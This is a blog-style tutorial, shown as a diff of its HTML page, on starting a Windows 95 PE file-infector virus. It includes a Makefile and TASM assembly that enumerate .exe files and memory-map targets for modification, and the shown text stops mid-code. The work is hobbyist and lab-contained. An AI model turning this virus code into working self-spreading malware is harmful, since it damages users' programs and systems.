@@ -1,0 +1,681 @@
+<!doctype html><html lang=en-us><head><title>PE File Infector Basics | VeXation</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Starting on an x86 virus that can inject new sections into PE executables."><meta name=generator content="Hugo 0.99.1"><meta name=ROBOTS content="NOINDEX, NOFOLLOW"><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/css/custom.css><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon></head><body><nav class=navigation><a href=/><span class=arrow>←</span>Home</a>
+<a href=/posts>Archive</a>
+<a href=/about>About</a>
+<a class=button href=https://log.vexation.ca/index.xml>Subscribe</a></nav><main class=main><section id=single><h1 class=title>PE File Infector Basics</h1><div class=tip><time datetime="2019-01-30 00:00:00 +0000 UTC">Jan 30, 2019</time></div><aside class=toc><details><summary>Table of Contents</summary><div><nav id=TableOfContents><ul><li><a href=#objectives>Objectives</a></li><li><a href=#generation-0>Generation 0</a></li><li><a href=#finding-target-exes>Finding target .EXEs</a></li><li><a href=#deciding-if-a-target-is-suitable>Deciding if a target is suitable</a><ul><li><a href=#what-should-be-checked>What should be checked?</a></li><li><a href=#checking-a-target-executable-file>Checking a target executable file</a></li><li><a href=#offsets-to-check>Offsets to check</a></li></ul></li><li><a href=#adding-virus-code>Adding virus code</a></li><li><a href=#writing-the-virus-code-into-the-new-section>Writing the virus code into the new section</a></li><li><a href=#complete-assembly-code>Complete Assembly code</a></li><li><a href=#verifying-the-work-so-far>Verifying the work so far</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></details></aside><div class=content><p>Welcome back! If this is your first visit to VeXation you may want to start by <a href=../welcome>reading an introduction to the project</a> or <a href=../setup>the development environment setup</a>. In this post I&rsquo;ll share some of my experience starting out on my Windows 95 file infector virus.</p><h1 id=objectives>Objectives <a href=#objectives class=anchor>🔗</a></h1><p>The first objective of a file infector virus is to add its own code to another file. In my case the files will be executables. The second objective of a file infector is to make sure the newly added virus code is run in addition to the original executable code. If the virus code isn&rsquo;t run it can&rsquo;t propagate to new executables. If the original executable code isn&rsquo;t run then the virus broke the program it infected and will probably be detected before spreading very far.</p><p>To make things manageable I started by focusing on the first objective: adding code to another executable. I prefer to work in small chunks where possible so I chose to break the task up as follows:</p><ol><li>Finding new target executables.</li><li>Deciding if a target is suitable for infection.</li><li>Adding a new section to the target with the correct size and metadata.</li><li>Writing the virus code into the new section of the target.</li></ol><p>As I introduce each topic at a high level I&rsquo;ll share some snippets of my assembly code so far. Towards the end I&rsquo;ll share the full assembly source code along with some pointers. Lastly I&rsquo;ll talk about how I validated my work with some handy low level tools.</p><h1 id=generation-0>Generation 0 <a href=#generation-0 class=anchor>🔗</a></h1><p>Initially it took me some time to wrap my head around <em>&ldquo;Generation 0&rdquo;</em> of a virus versus subsequent generations. I&rsquo;m not certain if anyone else uses this &ldquo;generation&rdquo; terminology but it&rsquo;s what made sense to me.</p><p>Typically when you encounter a virus as an end user it&rsquo;s from running a benign program that was infected by a virus. Have you ever asked yourself how that program was infected? Chances are high that it was infected by another infected benign program. If you imagine tracing these infections backwards eventually there must have been a &ldquo;Generation 1&rdquo;, the first benign executable infected by the virus.</p><p>How was the generation 1 program infected? The author of the virus must have conspired to do this using what I call &ldquo;Generation 0&rdquo; - a program built to bootstrap the infection process. Unlike &ldquo;Generation n&rdquo; there is no benign functionality in generation 0, it exists only to infect.</p><p>Having some terminology in mind for this was important because I found later on there were practical considerations to be made based on whether the code executing is generation 0 of the virus or a subsequent generation.</p><h1 id=finding-target-exes>Finding target .EXEs <a href=#finding-target-exes class=anchor>🔗</a></h1><p>One of the classic problems of virus development is making sure that your creation doesn&rsquo;t escape the &ldquo;lab&rdquo; or destroy your development system. I imagine this was extra tricky before virtualisation was easy. With the potential for disaster in mind I decided to start by only finding target executables to infect within the same directory as the generation 0 program. It isn&rsquo;t very difficult to recursively search other directories down the road.</p><p>This simple infection strategy makes development easier. For example I wrote my <a href=https://github.com/cpu/vexation/blob/63dd691b18b26f56381b53878a2f1fa29bb047a7/minijector/Makefile#L46-L49 target=_blank rel=noopener><code>Makefile</code>&rsquo;s <code>run</code> target</a> to copy a clean <code>calc.exe</code> from <code>C:\WINDOWS</code> into the current directory before running the generation 0 program, overwriting any previously infected versions in the process. I know the infection won&rsquo;t spread beyond the working directory and so everything is neatly contained.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-makefile data-lang=makefile><span style=display:flex><span><span style=color:#a6e22e>run</span><span style=color:#f92672>::</span> <span style=color:#66d9ef>$(</span>NAME<span style=color:#66d9ef>)</span>.EXE
+</span></span><span style=display:flex><span>   del CALC.EXE
+</span></span><span style=display:flex><span>   copy C:<span style=color:#ae81ff>\W</span>INDOWS<span style=color:#ae81ff>\C</span>ALC.EXE
+</span></span><span style=display:flex><span>   td32 <span style=color:#66d9ef>$(</span>NAME<span style=color:#66d9ef>)</span>.EXE
+</span></span></code></pre></td></tr></table></div></div><p>Finding target files requires using Win32 API functions. I found a copy of <a href=https://github.com/trietptm/OllyDbg-Archive/blob/master/HLP-Files/win32.hlp target=_blank rel=noopener><code>win32.hlp</code> for Windows 95</a> that I use as my primary reference for the available Win32 APIs, their arguments and their return values. <strong>Pay particular attention to API function return values!</strong> Some API functions (e.g. <code>FindNextFileA</code>) return zero for errors. Other API functions (e.g. <code>FindFirstFileA</code>) return something non-zero (e.g.<code>FindFirstFileA</code> returns <code>0xFFFFFFFF</code> on error).</p><p><p class=markdown-image><figure><a href=/posts/pe-infector-basics/win32.hlp.jpg><picture><source media="(max-width: 420px)" srcset=/posts/pe-infector-basics/win32.hlp_hub67db01fb25c950c2558307dd84705d7_103038_400x0_resize_q75_h2_box.webp><source media="(max-width: 920px)" srcset=/posts/pe-infector-basics/win32.hlp_hub67db01fb25c950c2558307dd84705d7_103038_600x0_resize_q75_h2_box.webp><source media="(max-width: 1400px)" srcset=/posts/pe-infector-basics/win32.hlp_hub67db01fb25c950c2558307dd84705d7_103038_800x0_resize_q75_h2_box.webp><img alt="Win95 HLP Screenshot" title="Win95 HLP Screenshot" src=win32.hlp.jpg loading=lazy class=img-fluid></picture></a><figcaption>1995's API docs aren't so bad after all.</figcaption></figure></p></p><p>To keep things simple I have been limiting my code to ASCII compatibility which means using <a href=https://docs.microsoft.com/en-us/windows/desktop/intl/unicode-in-the-windows-api target=_blank rel=noopener>the &ldquo;A&rdquo; variant of some win32 APIs</a> (for ASCII) vs the &ldquo;W&rdquo; variant (for Wide Chars). Remember to drop the &ldquo;A&rdquo; suffix when looking up documentation (e.g. search for <code>FindFirstFile</code> in the <code>win32.hlp</code> index not <code>FindFirstFileA</code>). Assembly programmers have to care about &ldquo;A&rdquo; vs &ldquo;W&rdquo; where normally the Visual C++ runtime hides this distinction from programmers with compile time magic.</p><p>To find files in the current directory requires using a combination of <a href=https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findfirstfilea target=_blank rel=noopener><code>FindFirstFileA</code></a> and <a href=https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findnextfilea target=_blank rel=noopener><code>FindNextFileA</code></a>. The first is used to start a directory traversal and the second is used to continue it. By providing a pointer to the null terminated string <code>"*.exe"</code> as the <code>lpFileName</code> I&rsquo;m able to start a traversal of all executables (if any!) in the current directory.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; inputs:   `infectFilter` -&gt; the pattern to find</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `findData`     -&gt; the data structure to populate</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; outputs:  `targetFile`   -&gt; the path to an .exe in the PWD to check</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
+</span></span><span style=display:flex><span>findfirst:
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> eax, offset infectFilter
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> ebx, offset findData
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>call</span> FindFirstFileA, eax, ebx
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; If we got an invalid handle from FindFirstFileA that means there were </span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; no EXEs in the directory. Jump to error to handle this case.</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> eax, INVALID_HANDLE_VALUE
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>je</span> error
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> [findHandle], eax
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>targetfound:
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Otherwise we have a potential .exe target to examine</span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Copy the name of the file from the find data to our targetFile var.</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> eax, offset targetFile
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> ebx, offset findData.cFileName
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>call</span> lstrcpy, eax, ebx
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> eax, <span style=color:#ae81ff>0h</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>je</span> error
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; If there was no error, map the target file.</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>jmp</span> mapfile
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; If we&#39;re here it means the targetFile wasn&#39;t any good.</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Time to look at the next available .exe file using FindNextFile</span>
+</span></span><span style=display:flex><span>findnext:
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> eax, [findHandle]
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> ebx, offset findData
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>call</span> FindNextFileA, eax, ebx
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> eax, <span style=color:#ae81ff>0h</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>je</span> error
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; If there was no error, we found a potential target. Jump back</span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; to targetFound.</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>jmp</span><span style=color:#66d9ef> targetfound</span>
+</span></span></code></pre></td></tr></table></div></div><h1 id=deciding-if-a-target-is-suitable>Deciding if a target is suitable <a href=#deciding-if-a-target-is-suitable class=anchor>🔗</a></h1><p>This is another classic virus dilemma. Not all target programs are created equal and infecting the wrong program can be disastrous, breaking the target and making the infection inert.</p><h2 id=what-should-be-checked>What should be checked? <a href=#what-should-be-checked class=anchor>🔗</a></h2><p>A good executable infector needs to check that:</p><ol><li>The target file is a true executable (e.g. not something else renamed to have an <code>.exe</code> extension).</li><li>The target file is a supported executable format (e.g. a PE executable).</li><li>The target file is a &ldquo;normal&rdquo; PE executable (e.g. not a DLL).</li><li>The target file&rsquo;s code is the right architecture (e.g. x86 code).</li><li>The target file is for a supported Windows version (e.g. Win95 not NT).</li><li>The target file has space for the infection, or can support adding space.</li><li>The target file hasn&rsquo;t already been infected.</li></ol><p>There&rsquo;s a lot to consider! Since I&rsquo;m targeting Windows 95 I knew the answer to all of the above involved understanding the <a href=https://en.wikipedia.org/wiki/Portable_Executable target=_blank rel=noopener>Portable Executable (PE) format</a>. This is the native executable format for Win95 and supplies ways for a diligent virus writer to check all of these things.</p><p>I found there was no better resource for understanding PE&rsquo;s than Matt Pietrek&rsquo;s classic from 1994: <a href="https://docs.microsoft.com/en-us/previous-versions/ms809762%28v=msdn.10%29" target=_blank rel=noopener>&ldquo;Peering Inside the PE: A Tour of the Win32 Portable Executable File Format&rdquo;</a>. It&rsquo;s a lot to take in at once but I hope calling out the most important parts as I go along will make it a bit more accessible. If you&rsquo;ve been around the block with modern Windows much of this will be familiar because Windows still uses PE executables!</p><p>If you&rsquo;re more visually minded then <a href=https://github.com/angea target=_blank rel=noopener>Ange Albertini&rsquo;s</a> excellent <a href=https://github.com/corkami/pics/tree/master/binary/pe101 target=_blank rel=noopener>PE 101 Illustrated</a> is another great companion resource to have handy.</p><p><p class=markdown-image><figure><a href=/posts/pe-infector-basics/pe.101.png><picture><source media="(max-width: 420px)" srcset=/posts/pe-infector-basics/pe.101_hu5c2d430e42c421b5a39abee2494e0192_649917_400x0_resize_q75_h2_box_3.webp><source media="(max-width: 920px)" srcset=/posts/pe-infector-basics/pe.101_hu5c2d430e42c421b5a39abee2494e0192_649917_600x0_resize_q75_h2_box_3.webp><source media="(max-width: 1400px)" srcset=/posts/pe-infector-basics/pe.101_hu5c2d430e42c421b5a39abee2494e0192_649917_800x0_resize_q75_h2_box_3.webp><img alt="PE 101 illustrated by Ange Albertini" title="PE 101 illustrated by Ange Albertini" src=pe.101.png loading=lazy class=img-fluid></picture></a><figcaption>PE 101 illustrated by Ange Albertini</figcaption></figure></p></p><h2 id=checking-a-target-executable-file>Checking a target executable file <a href=#checking-a-target-executable-file class=anchor>🔗</a></h2><p>At a high level checking a target file is pretty straight forward. I needed to:</p><ol><li>open the file for reading.</li><li>check the overall file size.</li><li>memory map the file.</li><li>carefully check offsets within the memory mapped contents.</li></ol><p>To open an existing file I need to use the counter-intuitively named <a href=https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-createfilea target=_blank rel=noopener><code>CreateFileA</code></a> function from the Win32 API. This returns a handle pointer for the file that can be used for further operations. The handle doesn&rsquo;t allow reading from the file by itself but can be used with API calls that can.</p><p>To get the file size I used the handle from <code>CreateFileA</code> with the <a href=https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-getfilesize target=_blank rel=noopener><code>GetFileSize</code></a> function. Windows supports file sizes from 0 to 2<sup>64</sup> bytes so the return value from <code>GetFileSize</code> is split into a lower order <code>DWORD</code> (four bytes) returned in the <code>eax</code> register (the win32 api uses <a href=https://en.wikipedia.org/wiki/X86_calling_conventions#stdcall target=_blank rel=noopener>the &ldquo;stdcall&rdquo; calling convention</a>) and a higher order <code>DWORD</code> (stored using the pointer provided as input to <code>GetFileSize</code>). Since I&rsquo;m only concerned with verifying a target file is at least big enough to hold the expected PE header structures I can ignore the pointer to the higher order <code>DWORD</code> and just examine the lower order <code>DWORD</code> returned directly from <code>GetFileSize</code>.</p><p>There are two paths forward to read and write data from the file handle. Either using <a href=https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-setfilepointer target=_blank rel=noopener><code>SetFilePointer</code></a> and <a href=https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-readfile target=_blank rel=noopener><code>ReadFile</code></a>/<a href=https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-writefile target=_blank rel=noopener><code>WriteFile</code></a> or using memory mapping. I chose to use memory mapping because it involved making less API calls and seemed slightly more straight forward.</p><p>Memory mapping requires calling <a href=https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createfilemappinga target=_blank rel=noopener><code>CreateFileMappingA</code></a> using the file handle from <code>CreateFileA</code> to get yet another handle, this time to a file mapping object. I was able to use the file mapping object handle with <code>MapViewOfFile</code> to map a specified portion of the underlying file into memory. The return value from this function is a pointer to the region of memory the file was mapped and it&rsquo;s possible to read and write from this region to access and change the file&rsquo;s contents.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; inputs:   `targetFile`       -&gt; the path to an .exe in the PWD to check</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; outputs:  `targetFileHandle` -&gt; handle to the target .exe</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `targetFileSize`   -&gt; the target&#39;s filesize (lower bound)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `targetMapHandle`  -&gt; a handle to a memory map of the target .exe</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `targetP`          -&gt; a pointer to the start of the memory map</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
+</span></span><span style=display:flex><span>mapfile:
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Open a file handle to the targetFile. Use READ + WRITE so we can modify </span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; the file easily if it turns out to be infectable.</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> eax, offset targetFile
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>call</span> CreateFileA, \
+</span></span><span style=display:flex><span>         eax,\                           <span style=color:#75715e>; file name</span>
+</span></span><span style=display:flex><span>         GENERIC_READ <span style=color:#f92672>+</span> GENERIC_WRITE,\  <span style=color:#75715e>; attributes</span>
+</span></span><span style=display:flex><span>         <span style=color:#ae81ff>0h</span>,\                            <span style=color:#75715e>; share mode (not used)</span>
+</span></span><span style=display:flex><span>         <span style=color:#ae81ff>0h</span>,\                            <span style=color:#75715e>; sec attributes (not used)</span>
+</span></span><span style=display:flex><span>         OPEN_EXISTING,\                 <span style=color:#75715e>; creation disposition</span>
+</span></span><span style=display:flex><span>         FILE_ATTRIBUTE_NORMAL,\         <span style=color:#75715e>; file attributes</span>
+</span></span><span style=display:flex><span>         <span style=color:#ae81ff>0h</span>                              <span style=color:#75715e>; template handle (???)</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> eax, INVALID_HANDLE_VALUE
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>je</span> findnext
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> [targetFileHandle], eax
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Get the target file&#39;s original size</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>call</span> GetFileSize, eax, <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> eax, INVALID_HANDLE_VALUE
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>je</span> findnext
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> [targetFileSize], eax
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; The target file should at least be big enough for a full IMAGE_DOS_HEADER</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> eax, size IMAGE_DOS_HEADER
